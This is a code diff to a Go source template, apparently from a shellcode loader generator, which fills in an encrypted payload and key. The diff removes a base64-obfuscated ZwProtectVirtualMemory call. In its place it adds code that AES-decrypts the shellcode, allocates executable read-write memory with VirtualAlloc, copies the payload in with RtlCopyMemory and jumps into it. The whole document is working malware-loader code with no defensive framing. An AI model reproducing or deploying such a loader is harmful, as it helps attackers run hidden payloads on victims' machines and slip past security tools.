@@ -15,11 +15,25 @@ package main
 
 import (
         "crypto/aes"
-        "encoding/base64"
         "encoding/hex"
         "os"
-    "unsafe"
+        "unsafe"
         "syscall"
+        "fmt"
+)
+
+const (
+    MEM_COMMIT             = 0x1000
+    MEM_RESERVE            = 0x2000
+    PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+    kernel32      = syscall.MustLoadDLL("kernel32.dll")
+    ntdll         = syscall.MustLoadDLL("ntdll.dll")
+
+    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
+    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
 func decrypt(key string, payload string) []byte {
@@ -39,28 +53,33 @@ func decrypt(key string, payload string) []byte {
 func main() {
     /* decrypt shellcode using AES */
     payload := decrypt("%s", "%s")
-    ntdll, _ := base64.StdEncoding.DecodeString("bnRkbGw=")
-    zwprotectMemory, _ := base64.StdEncoding.DecodeString("WndQcm90ZWN0VmlydHVhbE1lbW9yeQ==")
 
-    var hProcess uintptr = 0
-    var pBaseAddr = uintptr(unsafe.Pointer(&payload[0]))
-    var dwBufferLen = uint(len(payload))
-    var dwOldPerm uint32
+    fmt.Println(payload)
 
-    /* prepare syscall in memory */
-    syscall.NewLazyDLL(string(ntdll)).NewProc(string(zwprotectMemory)).Call(
-        hProcess - 1,
-        uintptr(unsafe.Pointer(&pBaseAddr)),
-        uintptr(unsafe.Pointer(&dwBufferLen)),
-        0x20, /* PAGE_EXEC_READ */
-        uintptr(unsafe.Pointer(&dwOldPerm)),
+    addr, _, err := VirtualAlloc.Call(
+        0,
+        uintptr(len(payload)),
+        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
     )
 
-    /* run syscall */
-    syscall.Syscall(
-        uintptr(unsafe.Pointer(&payload[0])),
-        0, 0, 0, 0,
+    if err != nil && err.Error() != "The operation completed successfully." {
+        syscall.Exit(0)
+    }
+
+    _, _, err = RtlCopyMemory.Call(
+        addr,
+        (uintptr)(unsafe.Pointer(&payload[0])),
+        uintptr(len(payload)),
     )
+
+    if err != nil && err.Error() != "The operation completed successfully." {
+        fmt.Println(err.Error())
+        syscall.Exit(0)
+    }
+
+    // jump to shellcode
+    syscall.Syscall(addr, 0, 0, 0, 0)
+
 }
 `, hexKey, hexShellcode)
 }
